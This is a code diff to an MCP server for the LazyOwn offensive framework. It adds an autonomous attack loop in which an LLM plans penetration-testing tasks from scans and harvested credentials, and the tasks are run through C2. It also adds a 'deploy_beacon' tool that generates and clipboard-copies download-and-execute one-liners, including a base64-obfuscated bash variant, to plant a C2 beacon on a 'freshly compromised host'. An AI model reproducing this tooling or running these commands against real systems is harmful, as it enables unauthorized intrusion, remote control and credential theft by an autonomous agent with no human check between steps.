@@ -1782,6 +1782,42 @@ async def list_tools() -> list[types.Tool]:
                         "type": "integer",
                         "description": "Seconds to pause between steps (default 3).",
                     },
+                    "bootstrap": {
+                        "type": "boolean",
+                        "description": (
+                            "Run the deterministic kill-chain bootstrap before the adaptive loop: "
+                            "ping (OS detect → os.json) → lazynmap (full TCP scan) → pwntomate "
+                            "(service-aware tools) → LLM task generation (tasks.json). "
+                            "Default true. Set false to skip and jump straight to the adaptive loop."
+                        ),
+                    },
+                },
+                "required": [],
+            },
+        ),
+        types.Tool(
+            name="lazyown_deploy_beacon",
+            description=(
+                "Generate and clipboard-copy the one-liner to deploy the LazyOwn beacon/stub "
+                "on a freshly compromised host. Reads sessions/os.json to detect platform "
+                "(Linux/Windows/Mac), picks the correct payload command, and copies it with xclip. "
+                "Also triggers do_c2 to compile the beacon if not already built. "
+                "Call this immediately after achieving foothold/intrusion success."
+            ),
+            inputSchema={
+                "type": "object",
+                "properties": {
+                    "platform_override": {
+                        "type": "string",
+                        "description": (
+                            "Force platform: 'linux', 'windows', 'mac'. "
+                            "If omitted, auto-detected from sessions/os.json."
+                        ),
+                    },
+                    "compile": {
+                        "type": "boolean",
+                        "description": "Compile the beacon before generating the deploy command (default true).",
+                    },
                 },
                 "required": [],
             },
@@ -5807,6 +5843,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         stop_on_high     = bool(arguments.get("stop_on_high_value_success", True))
         step_timeout     = int(arguments.get("step_timeout_s", 60))
         step_delay       = int(arguments.get("step_delay_s", 3))
+        run_bootstrap    = arguments.get("bootstrap", True)
         cat_map          = _load_category_command_map()
         high_value_cats  = {"intrusion", "privesc", "credential"}
 
@@ -5829,6 +5866,255 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         _blocked_cmds: set[str] = set()
         # Reactive engine — carries the highest-priority decision across steps
         _reactive_state: dict[str, str] = {}   # keys: "cmd", "args", "reason", "mitre"
+        # Bootstrap log — records the deterministic pre-flight steps
+        _bootstrap_log: list[dict] = []
+
+        def _read_os_json() -> dict:
+            """Read sessions/os.json and return the first entry or empty dict."""
+            os_path = SESSIONS_DIR / "os.json"
+            if os_path.exists():
+                try:
+                    data = json.loads(os_path.read_text())
+                    if isinstance(data, list) and data:
+                        return data[0]
+                except Exception:
+                    pass
+            return {}
+
+        def _wait_for_nmap_xml(tgt: str, timeout_s: int = 1800) -> str:
+            """
+            Block until sessions/scan_{tgt}.nmap.xml appears or timeout elapses.
+            Returns the XML path string on success, empty string on timeout.
+            Polls every 15 seconds; nmap on a /24 can take 20-30 min.
+            """
+            import glob as _glob
+            deadline = time.time() + timeout_s
+            while time.time() < deadline:
+                exact = SESSIONS_DIR / f"scan_{tgt}.nmap.xml"
+                if exact.exists() and exact.stat().st_size > 256:
+                    return str(exact)
+                matches = _glob.glob(str(SESSIONS_DIR / f"scan_*{tgt}*.nmap.xml"))
+                for m in matches:
+                    if os.path.getsize(m) > 256:
+                        return m
+                time.sleep(15)
+            return ""
+
+        def _generate_tasks_from_sessions(tgt: str, platform: str, api_key: str) -> list[dict]:
+            """
+            Read all available session artefacts for *tgt* and ask the LLM to produce
+            a prioritised list of penetration-testing tasks.  Merges the result into
+            sessions/tasks.json without overwriting existing entries.
+
+            Returns the list of newly-generated task dicts.
+            """
+            import glob as _glob
+
+            # Collect evidence from sessions/
+            evidence_parts: list[str] = []
+            nmap_path = SESSIONS_DIR / f"scan_{tgt}.nmap"
+            if nmap_path.exists():
+                try:
+                    evidence_parts.append(
+                        f"=== NMAP SCAN ({tgt}) ===\n"
+                        + nmap_path.read_text(errors="replace")[:4000]
+                    )
+                except Exception:
+                    pass
+
+            vuln_path = SESSIONS_DIR / f"vulns_{tgt}.nmap"
+            if vuln_path.exists():
+                try:
+                    evidence_parts.append(
+                        f"=== VULN SCRIPTS ===\n"
+                        + vuln_path.read_text(errors="replace")[:2000]
+                    )
+                except Exception:
+                    pass
+
+            # Pwntomate tool outputs (stored under sessions/{ip}/{port}/{toolname}/)
+            pwntomate_dirs = _glob.glob(str(SESSIONS_DIR / tgt / "*" / "*" / "*.txt"))
+            pwntomate_dirs += _glob.glob(str(Path.home() / ".pwntomate" / tgt / "*" / "*" / "*.txt"))
+            for pt in sorted(pwntomate_dirs)[:8]:
+                try:
+                    content = Path(pt).read_text(errors="replace")[:800]
+                    if content.strip():
+                        evidence_parts.append(f"=== {pt} ===\n{content}")
+                except Exception:
+                    pass
+
+            cred_globs = list((SESSIONS_DIR).glob("credentials*.txt"))
+            for cp in cred_globs[:2]:
+                try:
+                    evidence_parts.append(
+                        f"=== CREDENTIALS ===\n{cp.read_text(errors='replace')[:500]}"
+                    )
+                except Exception:
+                    pass
+
+            if not evidence_parts:
+                return []
+
+            evidence_text = "\n\n".join(evidence_parts)[:6000]
+
+            prompt = (
+                f"You are an expert penetration tester analysing evidence from target {tgt} "
+                f"(platform: {platform}).\n\n"
+                f"Evidence collected so far:\n{evidence_text}\n\n"
+                f"Generate a JSON array of 5-10 prioritised penetration testing tasks. "
+                f"Each task must have these fields:\n"
+                f"  id (string uuid4), title (string), description (string), phase (one of: "
+                f"recon|enum|exploit|privesc|lateral|credential|report), priority (1=highest, 5=lowest), "
+                f"command (the exact LazyOwn CLI command to run, e.g. 'gobuster', 'enum4linux'), "
+                f"status ('New'), target ('{tgt}').\n\n"
+                f"Return ONLY valid JSON array. No markdown. No explanation."
+            )
+
+            new_tasks: list[dict] = []
+            if api_key:
+                try:
+                    from modules.llm_client import LLMClient as _LLMC
+                    _llm = _LLMC(api_key=api_key)
+                    raw = _llm.ask(
+                        prompt,
+                        provider="groq",
+                        system="You are a penetration testing task planner. Reply only with valid JSON.",
+                        temperature=0.1,
+                    )
+                    import re as _re
+                    jm = _re.search(r'\[.*\]', raw, _re.DOTALL)
+                    if jm:
+                        import uuid as _uuid
+                        candidates = json.loads(jm.group())
+                        for t in candidates:
+                            if isinstance(t, dict) and t.get("title") and t.get("command"):
+                                t.setdefault("id", str(_uuid.uuid4())[:8])
+                                t.setdefault("status", "New")
+                                t.setdefault("target", tgt)
+                                new_tasks.append(t)
+                except Exception:
+                    pass
+
+            if not new_tasks:
+                return []
+
+            # Merge into sessions/tasks.json
+            tasks_path = SESSIONS_DIR / "tasks.json"
+            existing: list[dict] = []
+            if tasks_path.exists():
+                try:
+                    existing = json.loads(tasks_path.read_text())
+                    if not isinstance(existing, list):
+                        existing = []
+                except Exception:
+                    existing = []
+
+            existing_cmds = {t.get("command", "") for t in existing}
+            merged = existing + [t for t in new_tasks if t.get("command", "") not in existing_cmds]
+            try:
+                tmp = tasks_path.with_suffix(".tmp")
+                tmp.write_text(json.dumps(merged, indent=2))
+                tmp.replace(tasks_path)
+            except Exception:
+                pass
+
+            return new_tasks
+
+        def _next_pending_task() -> dict | None:
+            """
+            Pop the highest-priority 'New' task from sessions/tasks.json,
+            mark it 'Started', and return it.  Returns None if none pending.
+            """
+            tasks_path = SESSIONS_DIR / "tasks.json"
+            if not tasks_path.exists():
+                return None
+            try:
+                tasks = json.loads(tasks_path.read_text())
+                if not isinstance(tasks, list):
+                    return None
+                pending = [t for t in tasks if t.get("status") == "New"]
+                if not pending:
+                    return None
+                # Sort by priority (1 = highest), then by index
+                pending.sort(key=lambda t: int(t.get("priority", 5)))
+                chosen = pending[0]
+                for t in tasks:
+                    if t.get("id") == chosen.get("id"):
+                        t["status"] = "Started"
+                        break
+                tmp = tasks_path.with_suffix(".tmp")
+                tmp.write_text(json.dumps(tasks, indent=2))
+                tmp.replace(tasks_path)
+                return chosen
+            except Exception:
+                return None
+
+        def _mark_task_done(task_id: str, outcome: str) -> None:
+            """Update task status to Done or Blocked based on outcome."""
+            tasks_path = SESSIONS_DIR / "tasks.json"
+            if not tasks_path.exists():
+                return
+            try:
+                tasks = json.loads(tasks_path.read_text())
+                for t in tasks:
+                    if t.get("id") == task_id:
+                        t["status"] = "Done" if outcome == "success" else "Blocked"
+                        break
+                tmp = tasks_path.with_suffix(".tmp")
+                tmp.write_text(json.dumps(tasks, indent=2))
+                tmp.replace(tasks_path)
+            except Exception:
+                pass
+
+        def _bootstrap_sequence() -> list[dict]:
+            """
+            Run the deterministic kill-chain pre-flight before the adaptive loop:
+              1. ping  → detect OS, write sessions/os.json
+              2. lazynmap → full TCP scan, wait for XML (up to 30 min)
+              3. pwntomate → service-aware tool cascade from XML
+              4. LLM task generation → populate sessions/tasks.json
+
+            Returns a list of bootstrap step dicts for reporting.
+            """
+            steps: list[dict] = []
+            _api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
+
+            # Step 1 — ping
+            print(f"[bootstrap] Step 1/4: ping {target}", flush=True)
+            ping_out = _run_lazyown_command("ping", step_timeout)
+            os_info = _read_os_json()
+            platform = os_info.get("os", "Unknown")
+            steps.append({
+                "bootstrap_step": "ping",
+                "platform": platform,
+                "outcome": "success" if os_info else "unknown",
+            })
+
+            # Step 2 — lazynmap (fire-and-wait)
+            print(f"[bootstrap] Step 2/4: lazynmap {target}", flush=True)
+            _run_lazyown_command("lazynmap", 120)  # kicks off nmap; returns quickly
+            xml_path = _wait_for_nmap_xml(target, timeout_s=1800)
+            if xml_path:
+                steps.append({"bootstrap_step": "lazynmap", "xml": xml_path, "outcome": "success"})
+            else:
+                steps.append({"bootstrap_step": "lazynmap", "xml": "", "outcome": "timeout"})
+
+            # Step 3 — pwntomate
+            print(f"[bootstrap] Step 3/4: pwntomate {target}", flush=True)
+            pwn_status = _run_pwntomate_if_xml_ready(target)
+            _refresh_facts(target)
+            steps.append({"bootstrap_step": "pwntomate", "status": pwn_status})
+
+            # Step 4 — LLM task generation
+            print(f"[bootstrap] Step 4/4: generating tasks.json from sessions", flush=True)
+            new_tasks = _generate_tasks_from_sessions(target, platform, _api_key)
+            steps.append({
+                "bootstrap_step": "task_generation",
+                "tasks_created": len(new_tasks),
+                "titles": [t.get("title", "") for t in new_tasks[:5]],
+            })
+
+            return steps
 
         def _parquet_candidates(category: str, tgt: str) -> list[str]:
             """
@@ -5924,7 +6210,82 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 parts.append(f"-p '{password}'")
             return resolved_cmd, " ".join(parts)
 
+        # Tracks the task currently being executed by the loop so outcome can be recorded.
+        _active_task: dict | None = None
+
         def _execute_step() -> dict:
+            nonlocal _active_task
+
+            # ── Task-board priority: consume tasks.json before policy ─────────
+            pending_task = _next_pending_task()
+            if pending_task:
+                _active_task = pending_task
+                task_cmd   = pending_task.get("command", "").strip()
+                task_parts = task_cmd.split(None, 1)
+                t_cmd  = task_parts[0] if task_parts else task_cmd
+                t_args = task_parts[1] if len(task_parts) > 1 else ""
+                t_phase = pending_task.get("phase", "enum")
+
+                full_cmd = f"{t_cmd} {t_args}".strip()
+                print(f"[auto_loop] task '{pending_task.get('title','?')}' → {full_cmd}", flush=True)
+                c2_result = _c2_request("/api/run", method="POST", body={"command": full_cmd})
+                if "_error" in c2_result or "error" in c2_result:
+                    output = _run_lazyown_command(full_cmd, step_timeout)
+                    via = "subprocess"
+                else:
+                    output = c2_result.get("output", c2_result.get("result", ""))
+                    if not output:
+                        output = _run_lazyown_command(full_cmd, step_timeout)
+                        via = "subprocess"
+                    else:
+                        via = "c2"
+
+                step_rec = _policy.on_command_complete(target, t_cmd, t_args, output, None)
+                _mark_task_done(pending_task.get("id", ""), step_rec.outcome)
+                fail_key = f"{target}:{step_rec.category}:{t_cmd}"
+                if step_rec.outcome != "success":
+                    _fail_counts[fail_key] = _fail_counts.get(fail_key, 0) + 1
+
+                if output and output.strip():
+                    try:
+                        import re as _re_rag
+                        _safe = _re_rag.sub(r"[^a-zA-Z0-9_-]", "_", t_cmd)[:40]
+                        _odir = SESSIONS_DIR / "auto_loop_outputs"
+                        _odir.mkdir(parents=True, exist_ok=True)
+                        (_odir / f"{int(time.time())}_{_safe}.txt").write_text(
+                            output[:8000], errors="replace"
+                        )
+                    except Exception:
+                        pass
+
+                if _obs_parser is not None and _wm is not None:
+                    try:
+                        obs = _obs_parser.parse(output, host=target, tool=t_cmd)
+                        _wm.update_from_findings(obs.findings)
+                    except Exception:
+                        pass
+
+                should_stop = (
+                    stop_on_high
+                    and step_rec.outcome == "success"
+                    and step_rec.category in high_value_cats
+                )
+                return {
+                    "stop": should_stop,
+                    "step": {
+                        "command":    full_cmd,
+                        "category":   step_rec.category,
+                        "outcome":    step_rec.outcome,
+                        "reward":     step_rec.reward,
+                        "confidence": step_rec.confidence,
+                        "via":        via,
+                        "policy_rec": f"task:{pending_task.get('title','?')}",
+                        "source":     "tasks.json",
+                    },
+                }
+
+            _active_task = None
+
             recs = _policy.get_recommendations(target)
             if not recs:
                 return {"stop": True, "reason": "No policy recommendations available."}
@@ -6268,6 +6629,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 step_dict["reactive"] = _reactive_decision_note
             return {"stop": should_stop, "step": step_dict}
 
+        # Run the deterministic kill-chain bootstrap before the adaptive loop.
+        if run_bootstrap:
+            _bootstrap_log = await asyncio.get_event_loop().run_in_executor(
+                None, _bootstrap_sequence
+            )
+
         _loop_last_cmd: str = ""
         _loop_consecutive: int = 0
         _loop_history: list[str] = []   # sliding window for oscillation detection
@@ -6341,6 +6708,21 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             f"Auto-loop complete — {len(execution_log)} step(s) for target {target}",
             "",
         ]
+        if _bootstrap_log:
+            lines.append("## Bootstrap sequence")
+            for bs in _bootstrap_log:
+                bname = bs.get("bootstrap_step", "?")
+                if bname == "ping":
+                    lines.append(f"  ping → platform={bs.get('platform','?')} ({bs.get('outcome','?')})")
+                elif bname == "lazynmap":
+                    lines.append(f"  lazynmap → xml={bs.get('xml') or 'timeout'} ({bs.get('outcome','?')})")
+                elif bname == "pwntomate":
+                    lines.append(f"  pwntomate → {bs.get('status','?')}")
+                elif bname == "task_generation":
+                    n = bs.get("tasks_created", 0)
+                    titles = ", ".join(bs.get("titles", []))
+                    lines.append(f"  task_generation → {n} task(s) created: {titles}")
+            lines.append("")
         for i, s in enumerate(execution_log, 1):
             r_str = f"{s['reward']:+d}"
             lines.append(
@@ -7605,6 +7987,114 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         else:
             soul = await asyncio.get_event_loop().run_in_executor(None, _read_soul)
             return text(soul)
+
+    # ── deploy_beacon ─────────────────────────────────────────────────────────
+    elif name == "lazyown_deploy_beacon":
+        do_compile    = arguments.get("compile", True)
+        plat_override = (arguments.get("platform_override") or "").strip().lower()
+
+        def _deploy_beacon_sync() -> str:
+            """
+            Detect platform, compile beacon if needed, generate one-liner, copy to clipboard.
+            Returns a human-readable status string.
+            """
+            cfg_d = _load_payload()
+            lhost = cfg_d.get("lhost", "")
+            lport = cfg_d.get("lport", "4444")
+
+            # Resolve platform
+            platform = plat_override
+            if not platform:
+                os_path = SESSIONS_DIR / "os.json"
+                if os_path.exists():
+                    try:
+                        os_data = json.loads(os_path.read_text())
+                        if isinstance(os_data, list) and os_data:
+                            raw_os = os_data[0].get("os", "").lower()
+                            if "windows" in raw_os:
+                                platform = "windows"
+                            elif "linux" in raw_os:
+                                platform = "linux"
+                            elif "mac" in raw_os or "darwin" in raw_os:
+                                platform = "mac"
+                    except Exception:
+                        pass
+            if not platform:
+                platform = "linux"
+
+            # Optionally compile the beacon via do_c2
+            compile_note = ""
+            if do_compile:
+                choice_map = {"linux": "2", "windows": "1", "mac": "4"}
+                c2_choice = choice_map.get(platform, "2")
+                try:
+                    _run_lazyown_command(f"c2 {c2_choice}", timeout_s=120)
+                    compile_note = f"beacon compiled (platform={platform})"
+                except Exception as exc:
+                    compile_note = f"compile skipped: {exc}"
+
+            # Generate platform-appropriate one-liner
+            if not lhost:
+                return "lhost not set in payload.json — cannot generate deploy command"
+
+            if platform == "windows":
+                stub_url = f"http://{lhost}/stub.exe"
+                cmd = (
+                    f"powershell -c \"Invoke-WebRequest '{stub_url}' "
+                    f"-OutFile 'stub.exe'; Start-Process 'stub.exe'\""
+                )
+            elif platform == "mac":
+                cmd = f"curl http://{lhost}/stub -o /tmp/stub && chmod +x /tmp/stub && /tmp/stub"
+            else:
+                import base64 as _b64
+                raw = (
+                    f"curl http://{lhost}/stub -o /tmp/stub && "
+                    f"[ -s /tmp/stub ] && chmod +x /tmp/stub && /tmp/stub"
+                )
+                encoded = _b64.b64encode(raw.encode()).decode()
+                cmd = f"echo '{encoded}' | base64 -d | bash"
+
+            # Copy to clipboard
+            clip_note = ""
+            try:
+                import subprocess as _sp
+                _sp.run(
+                    ["xclip", "-sel", "clip"],
+                    input=cmd.encode(),
+                    check=True,
+                    capture_output=True,
+                )
+                clip_note = "copied to clipboard (xclip)"
+            except FileNotFoundError:
+                try:
+                    import subprocess as _sp
+                    _sp.run(
+                        ["xsel", "--clipboard", "--input"],
+                        input=cmd.encode(),
+                        check=True,
+                        capture_output=True,
+                    )
+                    clip_note = "copied to clipboard (xsel)"
+                except Exception:
+                    clip_note = "clipboard copy failed (xclip/xsel not available)"
+
+            lines = [
+                f"Platform:  {platform}",
+                f"lhost:     {lhost}",
+                f"lport:     {lport}",
+            ]
+            if compile_note:
+                lines.append(f"Compile:   {compile_note}")
+            lines += [
+                f"Clipboard: {clip_note}",
+                "",
+                "Deploy command (paste on foothold):",
+                cmd,
+            ]
+            return "\n".join(lines)
+
+        result_str = await asyncio.get_event_loop().run_in_executor(None, _deploy_beacon_sync)
+        return text(result_str)
 
     # ── create_tool ───────────────────────────────────────────────────────────
     elif name == "lazyown_create_tool":
